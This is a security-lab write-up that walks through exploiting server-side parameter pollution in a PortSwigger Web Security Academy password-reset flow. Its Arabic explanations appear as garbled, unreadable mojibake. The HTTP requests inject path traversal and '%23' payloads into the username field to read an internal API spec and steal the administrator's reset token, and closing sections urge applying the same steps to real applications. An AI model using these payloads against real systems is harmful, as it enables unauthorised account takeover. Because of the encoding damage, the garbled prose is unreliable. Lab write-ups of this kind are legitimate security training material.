## **Solving the Lab: Exploiting Server-side Parameter Pollution (Advanced Guide)**

### **ุงููุนุฑูุฉ ุงููุทููุจุฉ ูุญู ุงููุฎุชุจุฑ ูุชุทุจููู ูู ุจูุฆุฉ ุญููููุฉ**

ูุญู ูุฐุง ุงููุฎุชุจุฑ ุจุดูู ุงุญุชุฑุงูู ูุชุทุจููู ุนูู ุจูุฆุงุช ุญููููุฉุ ูุฌุจ ุฃู ูููู ูุฏูู ููู ูุชูุฏู ูู:

- **ุชุญุฏูุฏ ุงุณุชุฎุฏุงู ูุฏุฎูุงุช ุงููุณุชุฎุฏู ูู ูุณุงุฑุงุช URL ุฃู ุณูุงุณู ุงูุงุณุชุนูุงู (Query String) ุงูุฎุงุตุฉ ุจุงูู API.**
- **ุงุณุชุฎุฏุงู ุชูููุงุช ุงุฌุชูุงุฒ ุงููุณุงุฑุงุช (Path Traversal) ูุชุบููุฑ ุงูุทูุจุงุช ุงูููุฑุณูุฉ ุฅูู ุงูุณูุฑูุฑ.**
- **ุชุญููู ุงูู API ูู ุฎูุงู JavaScript ุฃู ูุงุฌูุงุช API ุงูููุชูุญุฉ ูุซู OpenAPI.**
- **ุงูุชูุงุนุจ ุจุชูุณููุงุช ุงูุจูุงูุงุช ูุซู JSON ู XML ูุงุณุชูุดุงู ุงูุซุบุฑุงุช ุงูุฃูููุฉ.**

---

### **ุงูุฎุทูุฉ 1: ุชุญููู ุงูุชุทุจูู ูุชุญุฏูุฏ ููุงุท ุงูุถุนู**

#### **1. ูุญุต ุงูุทูุจุงุช ุงูุตุงุฏุฑุฉ ุจุงุณุชุฎุฏุงู Burp Suite**

1. ุงูุชุญ **Burp's browser** ููู ุจุชุดุบูู **ุฅุนุงุฏุฉ ุชุนููู ูููุฉ ุงููุฑูุฑ ูููุณุชุฎุฏู ุงููุณุคูู (Administrator)**.
2. ุงูุชูู ุฅูู **Proxy > HTTP history** ูุงุจุญุซ ุนู ุงูุทูุจ `POST /forgot-password`.
3. ุงุจุญุซ ุนู ุฃู ูููุงุช **JavaScript** ูุฑุชุจุทุฉ ูุฏ ุชูุดู ุนู ุณููู ุงูุชุทุจููุ ูุซู:
   - `/static/js/forgotPassword.js`
4. ุงุถุบุท ุจุฒุฑ ุงููุฃุฑุฉ ุงูุฃููู ุนูู `POST /forgot-password` ูุงุฎุชุฑ **Send to Repeater**.
5. ูู **Repeater**ุ ุฃุนุฏ ุฅุฑุณุงู ุงูุทูุจ ููุฑุงูุจุฉ ุณููู ุงูุงุณุชุฌุงุจุฉ.

#### **2. ุงุฎุชุจุงุฑ ุฅุฏุฎุงู ุงููุณุชุฎุฏู ูู ุงููุณุงุฑุงุช**

- ุฃุฑุณู ุทูุจุงุช ุชุญุชูู ุนูู ููู ูุนุฏููุฉ ููู `username` ููุนุฑูุฉ ุฅุฐุง ูุงู ุงูุฅุฏุฎุงู ููุณุชุฎุฏู ูู ูุณุงุฑ URL ุนูู ุงูุณูุฑูุฑ.
- ุงุณุชุฎุฏู ุงูููู ุงูุชุงููุฉ ุนูู ุงูุชูุงูู:
  - `administrator%23` โ ููุฑุฌุน **Invalid route** โ ูุฏ ูููู ุงูุฅุฏุฎุงู ูู **ุงููุณุงุฑ**.
  - `administrator%3F` โ ููุฑุฌุน **Invalid route** โ `ุ` ุฑุจูุง ูุทุนุช ุงููุณุงุฑ.
  - `./administrator` โ ููุฑุฌุน ุงูุงุณุชุฌุงุจุฉ ุงูุฃุตููุฉ โ ุงูุฅุฏุฎุงู ุฑุจูุง ูู ุงููุณุงุฑ.
  - `../administrator` โ ููุฑุฌุน **Invalid route** โ ูุญุงููุฉ ุงุฌุชูุงุฒ ุงููุณุงุฑุงุช ุบูุฑ ูุงุฌุญุฉ.


```http
POST /forgot-password HTTP/2
Host: 0aad004f04744b78861ce82600350052.web-security-academy.net

csrf=UAwMSSLhmUmQUbRiPSrhdpinxHG8Szay&username=./administrator
```
---

### **ุงูุฎุทูุฉ 2: ุงูุชุดุงู ุชูุซูู ุงูู API ูุชุญููู ููุงุท ุงูุถุนู**

1. ุงุณุชุฎุฏู `../%23` ุซู ุฒูุฏ ุนุฏุฏ `../` ุชุฏุฑูุฌูุงู ุญุชู ุชุตู ุฅูู `../../../../%23`.
2. ูุงุญุธ ุฃู ูุฐุง ูุฏ ููุฑุฌุน **Not found**ุ ููุง ูุดูุฑ ุฅูู ุฃูู ุฎุฑุฌุช ุฎุงุฑุฌ ุฌุฐุฑ ุงูู API.
3. ุฌุฑูุจ ุทูุจ ูููุงุช ุชุนุฑูู API ุดุงุฆุนุฉ:

```http
POST /forgot-password HTTP/2
Host: 0aad004f04744b78861ce82600350052.web-security-academy.net

csrf=UAwMSSLhmUmQUbRiPSrhdpinxHG8Szay&username=../../../../%23
```
 
```http
POST /forgot-password HTTP/2
Host: 0aad004f04744b78861ce82600350052.web-security-academy.net

csrf=UAwMSSLhmUmQUbRiPSrhdpinxHG8Szay&username=../../../../openapi.json%23
```
4. ูุฏ ูุธูุฑ ูู ูุณุงุฑ API ูุซู:
###RESPONSE
```json
{
  "error": "Unexpected response from API server:\n{\n  \"openapi\": \"3.0.0\",\n  \"info\": {\n    \"title\": \"User API\",\n    \"version\": \"2.0.0\"\n  },\n  \"paths\": {\n    \"/api/internal/v1/users/{username}/field/{field}\": {\n      \"get\": {\n        \"tags\": [\n          \"users\"\n        ],\n        \"summary\": \"Find user by username\",\n        \"description\": \"API Version 1\",\n        \"parameters\": [\n          {\n            \"name\": \"username\",\n            \"in\": \"path\",\n            \"description\": \"Username\",\n            \"required\": true,\n            \"schema\": {\n        ..."
}
```
- `/api/internal/v1/users/{username}/field/{field}`

๐ฏ **ุชุญููู ุงููุณุงุฑ:**
- `{username}` ูู ุงุณู ุงููุณุชุฎุฏู ุงูููุฏุฎู.
- `{field}` ูุฏ ูููู ููุน ุงูุจูุงูุงุช ุงููุทููุจ ุงุณุชุฑุฏุงุฏูุง.

---

### **ุงูุฎุทูุฉ 3: ุงุณุชุบูุงู ุงูุซุบุฑุฉ ูุงูุชูุงุนุจ ุจุงูู API**

#### **1. ุงุณุชุฑุฌุงุน ุจูุงูุงุช ุงููุณุชุฎุฏู ุจุงุณุชุฎุฏุงู ุงูุญููู ุงููุชุงุญุฉ**

1. ุฃุฑุณู ุงูุทูุจ ุงูุชุงูู:
   - `username=administrator/field/foo%23`
2. ุณููุฑุฌุน **ุฑุณุงูุฉ ุฎุทุฃ** ูุฃู API ูุฏุนู ููุท ุญููููุง ูุนููุฉ.
3. ุฌุฑูุจ `email` ูุญูู ุตุงูุญ:
   - `username=administrator/field/email%23`
4. ูุงุญุธ ุฅุฐุง ุงุณุชุฌุงุจ API ุจููุณ ุงูุทุฑููุฉุ ููุง ูุฏ ูุดูุฑ ุฅูู ุฃู `email` ูู ุญูู ุตุงูุญ.

#### **2. ุงุณุชุฎุฑุงุฌ ุฑูุฒ ุฅุนุงุฏุฉ ุชุนููู ูููุฉ ุงููุฑูุฑ**

1. ูู **HTTP history**ุ ุงุจุญุซ ุนู `/static/js/forgotPassword.js`.
2. ุญุฏุฏ ููุทุฉ ููุงูุฉ ุฅุนุงุฏุฉ ุชุนููู ูููุฉ ุงููุฑูุฑ:
   - `/forgot-password?passwordResetToken=${resetToken}`
3. ุฌุฑูุจ ุงุณุชุฑุฏุงุฏ ูููุฉ `passwordResetToken`:
   - `username=administrator/field/passwordResetToken%23`
4. ุฅุฐุง ูุดู ุงูุทูุจ ุจุณุจุจ ุฅุตุฏุงุฑ API ุงููุณุชุฎุฏูุ ูู ุจุชุนุฏููู:
   - `username=../../v1/users/administrator/field/passwordResetToken%23`
5. ุฅุฐุง ูุฌุญ ุงูุทูุจุ ุณุชุธูุฑ ูู **ุฑูุฒ ุฅุนุงุฏุฉ ุชุนููู ูููุฉ ุงููุฑูุฑ**.

#### **3. ุงุณุชุฎุฏุงู ุงูุฑูุฒ ูุงุฎุชุฑุงู ุงูุญุณุงุจ**

1. ูู ุงููุชุตูุญุ ุฃุฏุฎู ููุทุฉ ููุงูุฉ ุฅุนุงุฏุฉ ุชุนููู ูููุฉ ุงููุฑูุฑ:
   - `/forgot-password?passwordResetToken=123456789`
2. ูู ุจุชุนููู ูููุฉ ูุฑูุฑ ุฌุฏูุฏุฉ.
3. **ุณุฌูู ุงูุฏุฎูู ูู Administrator.**
4. ุงูุชูู ุฅูู ููุญุฉ ุงูุชุญููุ ููู ุจุญุฐู ุงููุณุชุฎุฏู **Carlos** ูุญู ุงููุฎุชุจุฑ.

---

## **ููููุฉ ุงูุชุดุงู ูุฐู ุงูุซุบุฑุงุช ูู ุจูุฆุฉ ุญููููุฉุ**

### **1. ุงุณุชุฎุฏุงู ุฃุฏูุงุช ุงูู Reconnaissance**
- ุงุณุชุฎุฏู **Burp Suite** ู **Postman** ููุญุต ุทูุจุงุช API ูุงูุชุดุงู ุงููุฏุฎูุงุช ุงููุงุจูุฉ ููุชูุงุนุจ.
- ุงุณุชุฎุฑุฌ ูููุงุช **OpenAPI** ู **Swagger** ููุนุฑูุฉ ุฌููุน ุงูููุงุท ุงูุชู ูููู ุงุณุชูุฏุงููุง.

### **2. ุชุญููู ูุณุงุฑุงุช ุงูู API ูุฏูููุง**
- ุฌุฑูุจ **Path Traversal** ูู ุฎูุงู ุฅุฏุฎุงู `/../` ููุนุฑูุฉ ุฅุฐุง ูุงู ุงูุชุทุจูู ูุนูุฏ ุชูุฌูู ุงูุทูุจ.
- ุงุณุชุฎุฏู ุฑููุฒ ูุซู `#` ู `?` ููุนุฑูุฉ ูุง ุฅุฐุง ูุงู ุงูุฅุฏุฎุงู ููุณุชุฎุฏู ูู **ุงููุณุงุฑ ุฃู ุณูุณูุฉ ุงูุงุณุชุนูุงู**.

### **3. ุงุณุชุบูุงู ุซุบุฑุงุช ุงูุชุฎุตูุต ุงูุฌูุงุนู (Mass Assignment)**
- ุฃุฑุณู **ุญููู ุฅุถุงููุฉ** ูุซู `isAdmin: true` ูู ุงูุทูุจุงุช.
- ุฌุฑูุจ ุฅุฑุณุงู **ุจูุงูุงุช ุบูุฑ ูุชููุนุฉ** ูู JSON ุฃู XML.

### **4. ุงูุชูุงุนุจ ุจุฅุตุฏุงุฑุงุช ุงูู API**
- ุฌุฑูุจ ุงุณุชุฏุนุงุก ุฅุตุฏุงุฑุงุช ุฃูุฏู ูู ุงูู API ูุซู `/v1/` ุฃู `/v2/` ูุฑุคูุฉ ุงููุฑููุงุช ุงูุฃูููุฉ.
- ุชุฃูุฏ ููุง ุฅุฐุง ูุงูุช ุงูุชุทุจููุงุช ูุง ุฒุงูุช ุชุนุชูุฏ ุนูู ุฅุตุฏุงุฑุงุช ุบูุฑ ุขููุฉ.

๐ **ูุตูุญุฉ ุงุญุชุฑุงููุฉ:** ุงุณุชุฎุฏู ุฃุฏุงุฉ **jwt.io** ูุชุญููู **JSON Web Tokens (JWTs)**ุ ููุฏ ุชุญุชูู ุนูู ุจูุงูุงุช ุณุฑูุฉ ูููู ุงุณุชุฎุฏุงููุง ูู ุงูุงุฎุชุฑุงู.

---

## **ููุฎุต**
- **ุงุจุฏุฃ ุจุชุญููู ุงูุทูุจุงุช ุจุงุณุชุฎุฏุงู Burp Suite.**
- **ุงูุชุดู API Documentation ุจุงุณุชุฎุฏุงู JavaScript ุฃู OpenAPI.**
- **ุงุณุชุฎุฏู Path Traversal ูุงุฌุชูุงุฒ ุงููุณุงุฑุงุช ูุงููุตูู ุฅูู ุจูุงูุงุช ุญุณุงุณุฉ.**
- **ุงุณุชุบู ุฅุตุฏุงุฑ API ุบูุฑ ูุญูู ูุงุณุชุฎุฑุงุฌ ุฑููุฒ ุฅุนุงุฏุฉ ุชุนููู ูููุฉ ุงููุฑูุฑ.**
- **ุทุจู ููุณ ุงูุฎุทูุงุช ุนูู ุชุทุจููุงุช ุญููููุฉ ุจุงุณุชุฎุฏุงู ุฃุฏูุงุช ูุชูุฏูุฉ ูุซู Postman ู Burp Suite.**

๐ **ุจูุฐู ุงูุทุฑููุฉุ ููููู ุงุฎุชุจุงุฑ ูุงูุชุดุงู ุซุบุฑุงุช ุชููุซ ุงูุจุงุฑุงูุชุฑุงุช ุนูู ุงูุณูุฑูุฑ ูู ุฃู ุจูุฆุฉ ุญููููุฉ!**

